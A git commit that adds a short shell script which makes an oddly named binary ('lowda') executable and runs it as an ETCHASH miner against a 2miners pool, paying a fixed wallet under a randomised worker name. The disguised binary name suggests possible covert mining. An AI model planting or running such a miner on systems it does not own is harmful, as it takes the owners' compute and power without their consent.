d41e136f74aebc9193737cc57586d7bf135fd489
brusavido <86264258+brusavido@users.noreply.github.com>
2021-06-24 23:09:59 +0800

    Add files via upload

---
+++ gpu.sh
@@ -0,0 +1,7 @@
+  
+#!/bin/bash
+POOL=asia-etc.2miners.com:1010
+WALLET=0xa61e295093b6cd7c0a5bc3d0774d3b0ec52b1b1d
+WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
+chmod +x lowda
+./lowda --algo ETCHASH --pool $POOL --user $WALLET.$WORKER 
